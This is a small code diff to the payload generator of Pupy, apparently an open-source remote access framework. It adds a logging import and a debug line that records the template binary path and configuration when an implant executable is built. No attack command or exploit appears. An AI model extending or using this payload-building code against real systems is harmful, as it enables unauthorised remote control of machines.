@@ -3,6 +3,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+import logging
 import argparse
 import sys
 import os.path
@@ -25,6 +26,7 @@ def get_edit_pupyx64_exe(conf):
 	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), conf)
 
 def get_edit_binary(path, conf):
+	logging.debug("generating binary %s with conf: %s"%(path, conf))
 	if not "offline_script" in conf:
 		offline_script=""
 	else:
